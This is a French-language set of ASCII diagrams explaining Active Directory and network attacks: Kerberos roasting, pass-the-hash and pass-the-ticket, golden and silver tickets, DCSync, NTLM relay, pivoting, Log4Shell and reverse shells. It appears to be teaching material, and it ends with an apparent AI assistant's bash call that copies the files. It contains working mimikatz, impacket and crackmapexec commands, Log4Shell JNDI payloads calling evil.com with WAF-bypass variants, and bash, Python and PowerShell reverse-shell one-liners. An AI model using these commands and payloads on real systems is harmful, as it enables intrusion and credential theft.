# 🎨 Schémas Visuels - Active Directory & Network

Représentations visuelles pour les attaques AD et réseau.

---

## 📌 Kerberos Authentication

### Flux Normal
```
    ┌────────────────────────────────────────────────────────────────┐
    │                    KERBEROS AUTHENTICATION                     │
    │                                                                │
    │   ┌────────┐         ┌─────────────┐         ┌────────────┐    │
    │   │ Client │         │     KDC     │         │   Service  │    │
    │   │        │         │ (Domain     │         │  (Server)  │    │
    │   │        │         │ Controller) │         │            │    │
    │   └───┬────┘         └──────┬──────┘         └─────┬──────┘    │
    │       │                     │                      │           │
    │   1.  │  AS-REQ             │                      │           │
    │       │  (username)         │                      │           │
    │       │────────────────────▶│                      │           │
    │       │                     │                      │           │
    │   2.  │  AS-REP             │                      │           │
    │       │  (TGT ticket)       │                      │           │
    │       │◀────────────────────│                      │           │
    │       │                     │                      │           │
    │   3.  │  TGS-REQ            │                      │           │
    │       │  (TGT + SPN)        │                      │           │
    │       │────────────────────▶│                      │           │
    │       │                     │                      │           │
    │   4.  │  TGS-REP            │                      │           │
    │       │  (Service Ticket)   │                      │           │
    │       │◀────────────────────│                      │           │
    │       │                     │                      │           │
    │   5.  │  AP-REQ                                    │           │
    │       │  (Service Ticket)                          │           │
    │       │───────────────────────────────────────────▶│           │
    │       │                                            │           │
    │   6.  │  AP-REP (Access granted)                   │           │
    │       │◀───────────────────────────────────────────│           │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌─────────────────────────────────────────────────────────────────┐
    │  TICKETS                                                        │
    │                                                                 │
    │  TGT (Ticket Granting Ticket)                                   │
    │  ┌─────────────────────────────────────────────┐                │
    │  │  Chiffré avec: Hash du compte krbtgt       │                 │
    │  │  Contient: Username, timestamp, PAC         │                │
    │  │  Durée: 10h (par défaut)                    │                │
    │  └─────────────────────────────────────────────┘                │
    │                                                                 │
    │  Service Ticket (TGS)                                           │
    │  ┌─────────────────────────────────────────────┐                │
    │  │  Chiffré avec: Hash du compte de service   │                 │
    │  │  Contient: Username, timestamp, PAC         │                │
    │  │  Valide pour: Un service spécifique (SPN)  │                 │
    │  └─────────────────────────────────────────────┘                │
    └─────────────────────────────────────────────────────────────────┘
```

---

## 📌 Kerberoasting

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      KERBEROASTING                             │
    │                                                                │
    │   ┌────────────┐              ┌─────────────┐                  │
    │   │  Attacker  │              │     KDC     │                  │
    │   │ (any user) │              │             │                  │
    │   └─────┬──────┘              └──────┬──────┘                  │
    │         │                            │                         │
    │   1.    │  TGS-REQ pour service      │                         │
    │         │  avec SPN (ex: MSSQLSvc)   │                         │
    │         │───────────────────────────▶│                         │
    │         │                            │                         │
    │   2.    │  TGS-REP                   │                         │
    │         │  (Service Ticket)          │                         │
    │         │◀───────────────────────────│                         │
    │         │                            │                         │
    │         │  ┌────────────────────────────────────────────────┐  │
    │         │  │  Le ticket est chiffré avec le HASH du         │  │
    │         │  │  compte de service (mot de passe!)             │  │
    │         └──│                                                │  │
    │            └────────────────────────────────────────────────┘  │
    │                                                                │
    │   3.    OFFLINE CRACKING                                       │
    │         ┌──────────────────────────────────────────────────┐   │
    │         │  hashcat -m 13100 ticket.txt wordlist.txt        │   │
    │         │                                                  │   │
    │         │  Cracking...                                     │   │
    │         │  Password found: Summer2023!  💀                 │   │
    │         └──────────────────────────────────────────────────┘   │
    │                                                                │
    │   ⚠️ Pas besoin de privilèges! Tout utilisateur du domaine     │
    │      peut demander un ticket pour n'importe quel SPN.          │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  CIBLES IDÉALES                                                │
    │                                                                │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  Comptes de service avec SPN et mot de passe faible      │  │
    │  │                                                          │  │
    │  │  • SQLService     → MSSQLSvc/sql01.domain.local          │  │
    │  │  • HTTPService    → HTTP/web01.domain.local              │  │
    │  │  • ExchangeService → exchangeMDB/...                     │  │
    │  │                                                          │  │
    │  │  Commande:                                               │  │
    │  │  GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request   │  │
    │  └──────────────────────────────────────────────────────────┘  │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 AS-REP Roasting

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      AS-REP ROASTING                           │
    │                                                                │
    │   CONDITION: Compte avec "Do not require Kerberos              │
    │              preauthentication" activé                         │
    │                                                                │
    │   ┌────────────┐              ┌─────────────┐                  │
    │   │  Attacker  │              │     KDC     │                  │
    │   │ (no auth!) │              │             │                  │
    │   └─────┬──────┘              └──────┬──────┘                  │
    │         │                            │                         │
    │   1.    │  AS-REQ pour user cible    │                         │
    │         │  (sans pré-auth!)          │                         │
    │         │───────────────────────────▶│                         │
    │         │                            │                         │
    │   2.    │  AS-REP                    │                         │
    │         │  (TGT chiffré avec hash    │                         │
    │         │   du user!)                │                         │
    │         │◀───────────────────────────│                         │
    │         │                            │                         │
    │         │  ┌────────────────────────────────────────────────┐  │
    │         │  │  Le TGT contient une partie chiffrée avec      │  │
    │         │  │  le HASH du mot de passe de l'utilisateur!     │  │
    │         └──│                                                │  │
    │            └────────────────────────────────────────────────┘  │
    │                                                                │
    │   3.    OFFLINE CRACKING                                       │
    │         ┌──────────────────────────────────────────────────┐   │
    │         │  hashcat -m 18200 asrep.txt wordlist.txt         │   │
    │         │                                                  │   │
    │         │  Password: Welcome1  💀                          │   │
    │         └──────────────────────────────────────────────────┘   │
    │                                                                │
    │   ⚠️ Pas besoin de credentials! Juste le nom d'utilisateur.    │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  DIFFÉRENCE KERBEROAST vs AS-REP ROAST                         │
    │                                                                │
    │  ┌─────────────────────┬─────────────────────────────────────┐ │
    │  │     Kerberoast      │         AS-REP Roast                │ │
    │  ├─────────────────────┼─────────────────────────────────────┤ │
    │  │ Besoin credentials  │ Pas besoin de credentials           │ │
    │  │ Cible: Service SPN  │ Cible: User sans preauth            │ │
    │  │ Crack: hash service │ Crack: hash user                    │ │
    │  │ TGS-REQ/REP         │ AS-REQ/REP                          │ │
    │  └─────────────────────┴─────────────────────────────────────┘ │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Pass-the-Hash (PtH)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                       PASS-THE-HASH                            │
    │                                                                │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  NTLM Hash extrait (ex: via Mimikatz)                    │ │
    │   │                                                          │ │
    │   │  admin:500:aad3b435b51404ee:32ed87bdb5fdc5e9cba88547:::  │ │
    │   │                              ─────────────────────────   │ │
    │   │                              Ce hash suffit pour s'auth! │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   AUTHENTIFICATION NORMALE:                                    │
    │   ┌────────┐      password      ┌────────┐                     │
    │   │ Client │ ──────────────────▶│ Server │                     │
    │   └────────┘   → hash → auth    └────────┘                     │
    │                                                                │
    │   PASS-THE-HASH:                                               │
    │   ┌────────┐        hash        ┌────────┐                     │
    │   │Attacker│ ──────────────────▶│ Server │                     │
    │   └────────┘   (pas le pass!)   └────────┘                     │
    │                      │                                         │
    │                      └── Le protocole NTLM utilise le hash     │
    │                          directement, pas le mot de passe!     │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  OUTILS                                                        │
    │                                                                │
    │  # Mimikatz                                                    │
    │  sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:cmd    │
    │                                                                │
    │  # Impacket                                                    │
    │  psexec.py -hashes :NTLM_HASH domain/admin@TARGET              │
    │  wmiexec.py -hashes :NTLM_HASH domain/admin@TARGET             │
    │  smbexec.py -hashes :NTLM_HASH domain/admin@TARGET             │
    │                                                                │
    │  # CrackMapExec                                                │
    │  crackmapexec smb TARGET -u admin -H NTLM_HASH                 │
    │                                                                │
    │  # Evil-WinRM                                                  │
    │  evil-winrm -i TARGET -u admin -H NTLM_HASH                    │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Pass-the-Ticket (PtT)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      PASS-THE-TICKET                           │
    │                                                                │
    │   ÉTAPE 1: Extraire les tickets Kerberos de la mémoire         │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  mimikatz # sekurlsa::tickets /export                    │ │
    │   │                                                          │ │
    │   │  [0] Ticket: admin@krbtgt-CORP.LOCAL.kirbi               │ │
    │   │  [1] Ticket: admin@cifs-SERVER01.kirbi                   │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   ÉTAPE 2: Injecter le ticket dans une autre session           │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  mimikatz # kerberos::ptt admin@krbtgt-CORP.LOCAL.kirbi  │ │
    │   │                                                          │ │
    │   │  Ticket injecté dans la session courante!                │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   RÉSULTAT:                                                    │
    │   ┌────────────────────────────────────────────────────────┐   │
    │   │  Session attaquant                                     │   │
    │   │  + Ticket TGT de admin                                 │   │
    │   │  = Accès en tant que admin!  💀                        │   │
    │   └────────────────────────────────────────────────────────┘   │
    │                                                                │
    │   ⚠️ Différence avec PtH:                                      │
    │      PtH  = Hash NTLM (fonctionne avec NTLM auth)              │
    │      PtT  = Ticket Kerberos (fonctionne avec Kerberos auth)    │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Golden Ticket

```
    ┌────────────────────────────────────────────────────────────────┐
    │                       GOLDEN TICKET                            │
    │                                                                │
    │   PRÉREQUIS: Hash NTLM du compte krbtgt                        │
    │   (obtenu via DCSync ou dump du DC)                            │
    │                                                                │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  TGT LÉGITIME                 TGT FORGÉ (Golden)         │ │
    │   │  ┌───────────────┐            ┌───────────────┐          │ │
    │   │  │ Créé par KDC  │            │ Créé par      │          │ │
    │   │  │ Durée: 10h    │            │ attaquant!    │          │ │
    │   │  │ User réel     │            │ Durée: 10 ans │          │ │
    │   │  └───────────────┘            │ User: anyone  │          │ │
    │   │         │                     │ RID: 500      │          │ │
    │   │         │                     └───────────────┘          │ │
    │   │         │                            │                   │ │
    │   │         ▼                            ▼                   │ │
    │   │    Valide car                  Valide car                │ │
    │   │    signé par krbtgt            signé avec hash krbtgt!   │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   CRÉATION:                                                    │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  mimikatz # kerberos::golden                             │ │
    │   │    /user:Administrateur                                  │ │
    │   │    /domain:corp.local                                    │ │
    │   │    /sid:S-1-5-21-...                                     │ │
    │   │    /krbtgt:HASH_KRBTGT                                   │ │
    │   │    /id:500                                               │ │
    │   │    /ptt                                                  │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   💀 IMPACT: Accès Domain Admin pour ~10 ans!                  │
    │              Même si le password admin est changé!             │
    │                                                                │
    │   DÉFENSE: Changer le password de krbtgt 2 fois                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Silver Ticket

```
    ┌────────────────────────────────────────────────────────────────┐
    │                       SILVER TICKET                            │
    │                                                                │
    │   PRÉREQUIS: Hash NTLM du compte de service                    │
    │                                                                │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  GOLDEN TICKET           vs         SILVER TICKET        │ │
    │   │  ───────────────                    ─────────────        │ │
    │   │  Hash de krbtgt                     Hash du service      │ │
    │   │  Accès à TOUT                       Accès à UN service   │ │
    │   │  Passe par KDC                      Direct au service    │ │
    │   │  Logs sur DC                        PAS de logs DC!      │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   FLUX:                                                        │
    │                                                                │
    │   Golden:  Client ──▶ KDC ──▶ Service                          │
    │                        │                                       │
    │                     (logged)                                   │
    │                                                                │
    │   Silver:  Client ─────────▶ Service                           │
    │                   (bypass KDC!)                                │
    │                                                                │
    │   EXEMPLE:                                                     │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  # Ticket pour accéder au partage CIFS                   │ │
    │   │  kerberos::golden /user:admin /domain:corp.local         │ │
    │   │    /sid:S-1-5-21-... /target:server.corp.local           │ │
    │   │    /service:cifs /rc4:SERVICE_HASH /ptt                  │ │
    │   │                                                          │ │
    │   │  # Maintenant: accès au partage sans passer par KDC      │ │
    │   │  dir \\server\share  ✅                                  │ │
    │   └──────────────────────────────────────────────────────────┘ │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 DCSync

```
    ┌────────────────────────────────────────────────────────────────┐
    │                          DCSYNC                                │
    │                                                                │
    │   PRINCIPE: Simuler un Domain Controller pour demander         │
    │             la réplication des credentials                     │
    │                                                                │
    │   NORMAL (Réplication DC):                                     │
    │   ┌───────┐     "J'ai besoin des     ┌───────┐                 │
    │   │  DC1  │ ◀──  credentials pour ──▶│  DC2  │                 │
    │   └───────┘      réplication         └───────┘                 │
    │                                                                │
    │   ATTAQUE DCSync:                                              │
    │   ┌───────────┐  "Je suis un DC,    ┌───────┐                  │
    │   │ Attacker  │   donne-moi les  ──▶│  DC   │                  │
    │   │(mimikatz) │   credentials!"     └───┬───┘                  │
    │   └───────────┘                          │                     │
    │        │                                 │                     │
    │        │◀─────── Hashes de tous ─────────┘                     │
    │        │         les comptes!                                  │
    │        │                                                       │
    │   ┌────────────────────────────────────────────────────────┐   │
    │   │  mimikatz # lsadump::dcsync /domain:corp.local         │   │
    │   │           /user:krbtgt                                 │   │
    │   │                                                        │   │
    │   │  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4  💀       │   │
    │   └────────────────────────────────────────────────────────┘   │
    │                                                                │
    │   PRÉREQUIS:                                                   │
    │   • Droits "Replicating Directory Changes"                     │
    │   • Droits "Replicating Directory Changes All"                 │
    │   (Domain Admins, Enterprise Admins ont ces droits)            │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 NTLM Relay

```
    ┌────────────────────────────────────────────────────────────────┐
    │                        NTLM RELAY                              │
    │                                                                │
    │   ┌────────┐        ┌──────────┐        ┌────────┐             │
    │   │ Victim │        │ Attacker │        │ Target │             │
    │   └───┬────┘        └────┬─────┘        └───┬────┘             │
    │       │                  │                  │                  │
    │  1.   │ LLMNR/NBT-NS     │                  │                  │
    │       │ "Où est SERVEUR?"│                  │                  │
    │       │─────────────────▶│                  │                  │
    │       │                  │                  │                  │
    │  2.   │ "C'est moi!"     │                  │                  │
    │       │◀─────────────────│                  │                  │
    │       │                  │                  │                  │
    │  3.   │ Auth NTLM        │                  │                  │
    │       │─────────────────▶│                  │                  │
    │       │                  │                  │                  │
    │  4.   │                  │ Relaye auth      │                  │
    │       │                  │─────────────────▶│                  │
    │       │                  │                  │                  │
    │  5.   │                  │ Challenge        │                  │
    │       │ Challenge        │◀─────────────────│                  │
    │       │◀─────────────────│                  │                  │
    │       │                  │                  │                  │
    │  6.   │ Response         │                  │                  │
    │       │─────────────────▶│                  │                  │
    │       │                  │                  │                  │
    │  7.   │                  │ Response         │                  │
    │       │                  │─────────────────▶│                  │
    │       │                  │                  │                  │
    │  8.   │                  │ Accès accordé! 💀│                  │
    │       │                  │◀═════════════════│                  │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  OUTILS                                                        │
    │                                                                │
    │  # Responder (empoisonnement)                                  │
    │  responder -I eth0 -rv                                         │
    │                                                                │
    │  # ntlmrelayx (relay)                                          │
    │  ntlmrelayx.py -tf targets.txt -smb2support                    │
    │                                                                │
    │  # Cibles sans SMB signing                                     │
    │  crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt  │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Pivoting / Tunneling

### SSH Tunnels
```
    ┌────────────────────────────────────────────────────────────────┐
    │  LOCAL PORT FORWARD (-L)                                       │
    │                                                                │
    │  Accéder à un service interne via le pivot                     │
    │                                                                │
    │  ┌────────┐       ┌────────┐       ┌────────────┐              │
    │  │Attacker│──SSH──│ Pivot  │──────▶│Internal:80 │              │
    │  │:8080   │       │        │       │(web admin) │              │
    │  └────────┘       └────────┘       └────────────┘              │
    │                                                                │
    │  ssh -L 8080:internal:80 user@pivot                            │
    │                                                                │
    │  Attacker browse http://localhost:8080                         │
    │  → Redirigé vers internal:80                                   │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  REMOTE PORT FORWARD (-R)                                      │
    │                                                                │
    │  Exposer un service local sur le réseau distant                │
    │                                                                │
    │  ┌────────┐       ┌────────┐                                   │
    │  │Attacker│──SSH──│ Pivot  │:4444                              │
    │  │:4444   │       │        │                                   │
    │  └────────┘       └────────┘                                   │
    │                        │                                       │
    │                        ▼                                       │
    │                   Connexions vers pivot:4444                   │
    │                   arrivent sur attacker:4444                   │
    │                                                                │
    │  ssh -R 4444:localhost:4444 user@pivot                         │
    │  (Utile pour recevoir un reverse shell du réseau interne)      │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  DYNAMIC PORT FORWARD / SOCKS (-D)                             │
    │                                                                │
    │  Proxy SOCKS pour accéder à tout le réseau interne             │
    │                                                                │
    │  ┌────────┐       ┌────────┐       ┌────────────────┐          │
    │  │Attacker│──SSH──│ Pivot  │──────▶│ Réseau interne │          │
    │  │:1080   │SOCKS  │        │       │ 192.168.x.x    │          │
    │  └────────┘       └────────┘       └────────────────┘          │
    │                                                                │
    │  ssh -D 1080 user@pivot                                        │
    │                                                                │
    │  proxychains nmap 192.168.1.0/24                               │
    │  proxychains curl http://192.168.1.100                         │
    └────────────────────────────────────────────────────────────────┘
```

### Chisel
```
    ┌────────────────────────────────────────────────────────────────┐
    │  CHISEL REVERSE SOCKS                                          │
    │                                                                │
    │  ┌────────────┐              ┌────────────┐                    │
    │  │  Attacker  │◀─────────────│   Victim   │                    │
    │  │  (server)  │   Reverse    │  (client)  │                    │
    │  │  :8000     │   Tunnel     │            │                    │
    │  └─────┬──────┘              └────────────┘                    │
    │        │                           │                           │
    │        │ SOCKS :1080               │                           │
    │        ▼                           │                           │
    │   proxychains                      │                           │
    │   scan réseau ──────────────────▶ Réseau interne               │
    │                                                                │
    │  # Attacker                                                    │
    │  ./chisel server -p 8000 --reverse                             │
    │                                                                │
    │  # Victim                                                      │
    │  ./chisel client ATTACKER:8000 R:socks                         │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Log4Shell (CVE-2021-44228)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                        LOG4SHELL                               │
    │                                                                │
    │  ┌────────┐        ┌────────────┐        ┌────────────┐        │
    │  │Attacker│        │  Target    │        │LDAP Server │        │
    │  └───┬────┘        │ (Log4j)    │        │(Attacker)  │        │
    │      │             └─────┬──────┘        └─────┬──────┘        │
    │      │                   │                     │               │
    │  1.  │ Requête avec:     │                     │               │
    │      │ ${jndi:ldap://    │                     │               │
    │      │ evil.com/a}       │                     │               │
    │      │──────────────────▶│                     │               │
    │      │                   │                     │               │
    │  2.  │                   │ Log4j parse         │               │
    │      │                   │ et fait lookup      │               │
    │      │                   │ JNDI                │               │
    │      │                   │────────────────────▶│               │
    │      │                   │                     │               │
    │  3.  │                   │ Réponse: charge     │               │
    │      │                   │ classe depuis       │               │
    │      │                   │ http://evil/Exp.class               │
    │      │                   │◀────────────────────│               │
    │      │                   │                     │               │
    │  4.  │                   │                     │               │
    │      │          ┌────────────────────┐        │                │
    │      │          │ Classe chargée et  │        │                │
    │      │          │ EXÉCUTÉE!          │        │                │
    │      │          │ → RCE! 💀          │        │                │
    │      │          └────────────────────┘        │                │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  POINTS D'INJECTION                                            │
    │                                                                │
    │  Tout ce qui est loggé par l'application:                      │
    │                                                                │
    │  • User-Agent: ${jndi:ldap://evil.com/a}                       │
    │  • X-Forwarded-For: ${jndi:ldap://evil.com/a}                  │
    │  • Referer: ${jndi:ldap://evil.com/a}                          │
    │  • X-Api-Version: ${jndi:ldap://evil.com/a}                    │
    │  • username=${jndi:ldap://evil.com/a}                          │
    │  • search?q=${jndi:ldap://evil.com/a}                          │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  BYPASS WAF                                                    │
    │                                                                │
    │  ${${lower:j}ndi:${lower:l}dap://evil.com/a}                   │
    │  ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}             │
    │  ${${env:NaN:-j}ndi${env:NaN:-:}ldap://evil.com/a}             │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Reverse Shell

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      REVERSE SHELL                             │
    │                                                                │
    │  ┌────────────┐                      ┌────────────┐            │
    │  │  Attacker  │◀─────────────────────│   Victim   │            │
    │  │  (listener)│    Connexion         │  (exécute  │            │
    │  │  nc -lvnp  │    sortante          │  payload)  │            │
    │  │  4444      │                      │            │            │
    │  └────────────┘                      └────────────┘            │
    │        │                                   │                   │
    │        │                                   │                   │
    │        └─────────────────────────────────┘                     │
    │              Shell interactif                                  │
    │                                                                │
    │  POURQUOI REVERSE (et pas BIND)?                               │
    │  • Firewall bloque souvent les connexions ENTRANTES            │
    │  • Mais autorise les connexions SORTANTES (web, etc.)          │
    │  • NAT: la victime peut être derrière un routeur               │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  BIND SHELL (moins courant)                                    │
    │                                                                │
    │  ┌────────────┐                      ┌────────────┐            │
    │  │  Attacker  │─────────────────────▶│   Victim   │            │
    │  │  (connect) │    Connexion         │  (écoute)  │            │
    │  │            │    entrante          │  port 4444 │            │
    │  └────────────┘                      └────────────┘            │
    │                                                                │
    │  ⚠️ Souvent bloqué par firewall                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  PAYLOADS COURANTS                                             │
    │                                                                │
    │  # Bash                                                        │
    │  bash -i >& /dev/tcp/ATTACKER/4444 0>&1                        │
    │                                                                │
    │  # Python                                                      │
    │  python -c 'import socket,subprocess,os;                       │
    │  s=socket.socket();s.connect(("ATTACKER",4444));               │
    │  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);                  │
    │  os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'      │
    │                                                                │
    │  # PowerShell                                                  │
    │  $c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);         │
    │  $s=$c.GetStream();[byte[]]$b=0..65535|%{0};                   │
    │  while(($i=$s.Read($b,0,$b.Length)) -ne 0){                    │
    │  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);        │
    │  $r=(iex $d 2>&1|Out-String);$s.Write(...)};$c.Close()         │
    └────────────────────────────────────────────────────────────────┘
```

---

Maintenant je copie les fichiers vers les outputs et crée un ZIP :

<function_calls>
<invoke name="bash_tool">
<parameter name="command">cp /home/claude/schemas_vulnerabilites_web.md /mnt/user-data/outputs/ && \
cp /home/claude/schemas_vulnerabilites_ad_network.md /mnt/user-data/outputs/ && \
ls -lh /mnt/user-data/outputs/*.md
